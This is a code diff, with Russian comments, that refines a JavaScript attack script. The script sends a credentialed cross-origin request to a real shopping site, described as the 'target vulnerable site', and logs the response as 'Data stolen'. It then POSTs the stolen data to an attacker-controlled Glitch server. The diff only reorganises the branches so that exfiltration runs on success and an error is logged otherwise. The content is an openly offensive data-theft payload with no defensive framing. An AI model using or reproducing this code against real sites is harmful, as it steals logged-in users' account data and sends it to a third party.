@@ -17,24 +17,18 @@
             xhr.open('GET', 'https://www.temu.com/', true);  // Целевой уязвимый сайт
             xhr.withCredentials = true;
             xhr.onreadystatechange = function() {
-                if (xhr.readyState === 4 && xhr.status === 200) {
-                    console.log('Data stolen:', xhr.responseText);
+                if (xhr.readyState === 4) {
+                    if (xhr.status === 200) {
+                        console.log('Data stolen:', xhr.responseText);
 
-                    // Отправка украденных данных на ваш сервер на Glitch
-                    var exfil = new XMLHttpRequest();
-                    exfil.open('POST', 'https://spangle-leeward-layer.glitch.me', true);  // Ваша ссылка на сервер
-                    exfil.setRequestHeader('Content-Type', 'application/json');
-                    exfil.send(JSON.stringify({ stolenData: xhr.responseText }));
-xhr.onreadystatechange = function() {
-    if (xhr.readyState === 4) {
-        if (xhr.status === 200) {
-            console.log('Data stolen:', xhr.responseText);
-        } else {
-            console.error('Failed to fetch data. Status:', xhr.status, 'Response:', xhr.responseText);
-        }
-    }
-};
-
+                        // Отправка украденных данных на ваш сервер на Glitch
+                        var exfil = new XMLHttpRequest();
+                        exfil.open('POST', 'https://spangle-leeward-layer.glitch.me', true);  // Ваша ссылка на сервер
+                        exfil.setRequestHeader('Content-Type', 'application/json');
+                        exfil.send(JSON.stringify({ stolenData: xhr.responseText }));
+                    } else {
+                        console.error('Failed to fetch data. Status:', xhr.status, 'Response:', xhr.responseText);
+                    }
                 }
             };
             xhr.send();
